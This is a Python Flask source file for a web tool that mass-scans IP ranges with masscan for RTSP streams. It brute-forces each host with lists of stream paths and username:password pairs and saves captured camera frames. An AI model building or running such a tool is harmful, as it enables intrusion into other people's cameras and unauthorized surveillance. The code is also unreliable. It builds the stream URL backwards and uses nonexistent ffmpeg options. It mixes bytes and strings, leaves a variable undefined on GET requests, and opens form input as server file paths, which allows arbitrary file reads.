from flask import Flask, render_template, request
import os
import subprocess
import tempfile
import argparse
import datetime
import concurrent.futures
import masscan

app = Flask(__name__)

def capture_image(ip_address, rtsp_route, username, password, image_folder):
    # Construct the RTSP URL
    rtsp_url = f"{rtsp_route}/{ip_address}"

    # Use ffmpeg to capture the first frame of the stream to a temporary file, including the username and password if provided
    ffmpeg_args = ["ffmpeg", "-y", "-timeout", "30", "-i", rtsp_url, "-vframes", "1", "-threads", "4"]
    if username:
        ffmpeg_args += ["-user", username]
    if password:
        ffmpeg_args += ["-passwd", password]
    with tempfile.NamedTemporaryFile() as image_file:
        ffmpeg_args += [image_file.name]
        ffmpeg_output = subprocess.run(ffmpeg_args, capture_output=True).stdout

        # Check if the image was successfully captured
        if "Invalid data found" not in ffmpeg_output:
            # Save the image to the image folder
            image_path = os.path.join(image_folder, f"{ip_address}.jpg")
            with open(image_path, "wb") as f:
                f.write(image_file.read())

@app.route("/", methods=["GET", "POST"])
def rtsp_scan():
    if request.method == "POST":
        # Read the form fields
        ip_addresses_file = request.form["ip_addresses_file"]
        rtsp_routes_file = request.form["rtsp_routes_file"]
        credentials_file = request.form["credentials_file"]
        ports = request.form["ports"]
        timeout = int(request.form["timeout"])
        ip_range = request.form["ip_range"]

        # Create a thread pool to perform the image captures concurrently
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            # Read the list of RTSP routes from the specified text file
            with open(rtsp_routes_file) as f:
                rtsp_routes = f.read().splitlines()

            # Read the list of usernames and passwords from the specified text file
            with open(credentials_file) as f:
                credentials = [(line.split(":")[0], line.split(":")[1]) for line in f.read().splitlines()]

            # Create a folder to store the captured images, using the current date and time as the folder name
            now = datetime.datetime.now()
            image_folder = os.path.join("images", now.strftime("%Y-%m-%d_%H-%M-%S"))
            os.makedirs(image_folder, exist_ok=True)

            # If an IP addresses file was specified, read the list of IP addresses from the file
            if ip_addresses_file:
                with open(ip_addresses_file) as f:
                    ip_addresses = f.read().splitlines()

            # Otherwise, use masscan to scan for open RTSP streams on the specified ports
            else:
                # Construct the masscan command-line arguments
                masscan_args = ["masscan", "-p", ports, "--max-rate", "10000", "--timeout", str(timeout), "--range", ip_range]

                # Run masscan to find open RTSP streams
                scanner = masscan.PortScanner()
                scanner.scan(arguments=masscan_args)

                # Get a list of the IP addresses with open RTSP streams
                ip_addresses = [host for host in scanner.all_hosts if scanner[host]['tcp'].get(ports)]

            # Try each RTSP route and each set of credentials until a stream is found
            for ip_address in ip_addresses:
                for rtsp_route in rtsp_routes:
                    for username, password in credentials:
                        # Submit a task to the thread pool to capture the image
                        future = executor.submit(capture_image, ip_address, rtsp_route, username, password, image_folder)

        # Get a list of the captured images
        images = []
        for file in os.listdir(image_folder):
            file_path = os.path.join(image_folder, file)
            if os.path.isfile(file_path):
                images.append(file_path)

    return render_template("rtsp_scan.html", images=images)